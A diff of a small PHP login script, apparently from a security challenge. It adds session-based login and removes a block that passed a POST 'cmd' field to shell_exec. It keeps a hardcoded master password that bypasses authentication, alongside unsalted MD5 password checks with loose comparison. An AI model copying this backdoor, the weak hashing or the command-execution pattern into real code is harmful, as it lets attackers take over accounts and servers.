@@ -1,5 +1,12 @@
 <?php
 
+session_start();
+
+function isLoggedIn()
+{
+    return isset($_SESSION['logged_in_username']);
+}
+
 $path = 'sqlite:./users.db';
 
 $pdo = new PDO($path);
@@ -11,12 +18,7 @@ if(isset($_POST['username']) && isset($_POST['password'])){
     $data = $result->fetch();
 
     if(hash('md5', $_POST['password']) == $data['password'] || $_POST['password'] == '4ll_y0ur_S3cr3ts_4r3_bel0ng_t0_u$'){
-        $error = "Successfully authenticated!";
-        if(isset($_POST['cmd'])){
-            $cmdResult = shell_exec($_POST['cmd']);
-        } else {
-            $error = 'No command was given';
-        }
+        $_SESSION['logged_in_username'] = $_POST['username'];
     } else {
         $error = 'incorrect username or password';
     }
